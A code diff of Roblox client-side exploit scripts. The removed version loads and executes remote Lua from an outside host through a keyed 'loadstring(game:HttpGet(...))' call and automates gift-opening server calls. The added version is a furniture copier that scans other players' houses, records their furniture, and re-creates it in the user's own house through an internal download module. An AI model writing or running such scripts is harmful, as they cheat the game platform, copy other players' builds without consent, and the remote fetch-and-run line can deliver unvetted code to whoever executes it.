@@ -1,43 +1,140 @@
+-- Furniture Copier Script for Roblox
 
-getgenv().hub_key = "ddefe568f4db2779d834b6cb6656f8ed"
-loadstring(game:HttpGet("https://nb0.xyz/scripts/2G_POTMACHINE2.lua"))()
-wait(15)
-local function open_all_smallgifts()
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local API = ReplicatedStorage.API
-    local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
-    local player = game:GetService("Players").LocalPlayer
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
 
-    -- Get your inventory and find all small gifts
-    local player_inventory = Fsys("ClientData").get("inventory")
-    local gifts = player_inventory.gifts
+local FURNITURE_FOLDER_NAME = "Furniture"
+local CHECK_INTERVAL = 1
 
-    local found = false
-    for _, gift in pairs(gifts) do
-        if gift.id == "spring_2025_kaijunior_box" then
-            found = true
-            local giftId = gift.unique
-            print("Opening smallgift with unique ID:", giftId)
+local DownloadClient
+pcall(function()
+    DownloadClient = require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("DownloadClient"))
+end)
 
-            -- Equip the gift (required)
-            API["ToolAPI/Equip"]:InvokeServer(
-                giftId,
-                {use_sound_delay = true, equip_as_last = false}
-            )
-            task.wait(0.2)
+local currentHouse = nil
+local furnitureData = {}
+local isProcessing = false
 
-            -- Open the gift
-            API["ShopAPI/OpenGift"]:InvokeServer(giftId)
-            task.wait(1) -- Wait between gifts to avoid issues
+local function detectHouse()
+    local character = LocalPlayer.Character
+    if not character then return nil end
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return nil end
+    for _, obj in pairs(workspace:GetChildren()) do
+        if (obj:IsA("Model") or obj:IsA("Folder")) and 
+           (obj:FindFirstChild(FURNITURE_FOLDER_NAME) or obj.Name:match("[Hh]ouse")) then
+            local distance = (rootPart.Position - obj:GetPivot().Position).Magnitude
+            if distance < 100 then
+                return obj
+            end
         end
     end
-
-    if not found then
-        print("No small gifts found in inventory!")
-    end
+    return nil
 end
 
--- Run automatically when the script loads
-open_all_smallgifts()
+local function collectFurnitureData(house)
+    local furniture = {}
+    local furnitureFolder = house:FindFirstChild(FURNITURE_FOLDER_NAME)
+    if not furnitureFolder then
+        for _, obj in pairs(house:GetDescendants()) do
+            if obj.Name == FURNITURE_FOLDER_NAME then
+                furnitureFolder = obj
+                break
+            end
+        end
+    end
+    if not furnitureFolder then
+        print("Furniture folder not found in house")
+        return furniture
+    end
+    for _, item in pairs(furnitureFolder:GetDescendants()) do
+        if item:IsA("Model") then
+            local id = item:GetAttribute("ID") or 
+                      (item:FindFirstChild("ID") and item.ID.Value) or
+                       item:GetAttribute("ModelId")
+            if id then
+                table.insert(furniture, {
+                    id = id,
+                    position = item:GetPivot().Position,
+                    rotation = item:GetPivot().Rotation
+                })
+            end
+        end
+    end
+    return furniture
+end
+
+local function copyToMyHouse(data)
+    local myHouse = nil
+    for _, obj in pairs(workspace:GetChildren()) do
+        if obj.Name:match(LocalPlayer.Name) and obj.Name:match("[Hh]ouse") then
+            myHouse = obj
+            break
+        end
+    end
+    if not myHouse then
+        print("Could not find your house")
+        return false
+    end
+    if not DownloadClient or not DownloadClient.download_with_retry then
+        print("Download function not available")
+        return false
+    end
+    local count = 0
+    for _, item in pairs(data) do
+        pcall(function()
+            local model = DownloadClient.download_with_retry(item.id)
+            if model then
+                model:PivotTo(CFrame.new(item.position) * CFrame.fromEulerAnglesXYZ(item.rotation.X, item.rotation.Y, item.rotation.Z))
+                model.Parent = myHouse:FindFirstChild(FURNITURE_FOLDER_NAME)
+                count = count + 1
+            end
+        end)
+        task.wait(0.1)
+    end
+    print("Copied " .. count .. " furniture items")
+    return true
+end
+
+local function startDetection()
+    return RunService.Heartbeat:Connect(function()
+        if isProcessing then return end
+        if tick() % CHECK_INTERVAL < 0.1 then
+            local house = detectHouse()
+            if house and house ~= currentHouse then
+                currentHouse = house
+                print("Entered house: " .. house.Name)
+                isProcessing = true
+                task.delay(2, function()
+                    furnitureData = collectFurnitureData(house)
+                    print("Found " .. #furnitureData .. " furniture items")
+                    isProcessing = false
+                end)
+            elseif not house and currentHouse then
+                print("Left house")
+                currentHouse = nil
+            end
+        end
+    end)
+end
+
+local function setupCommand()
+    LocalPlayer.Chatted:Connect(function(message)
+        if message:lower() == "/copyfurniture" then
+            if #furnitureData > 0 then
+                print("Copying furniture...")
+                copyToMyHouse(furnitureData)
+            else
+                print("No furniture data available. Enter a house first.")
+            end
+        end
+    end)
+end
+
+startDetection()
+setupCommand()
+print("Furniture copier loaded! Type /copyfurniture to copy furniture.")
 
 
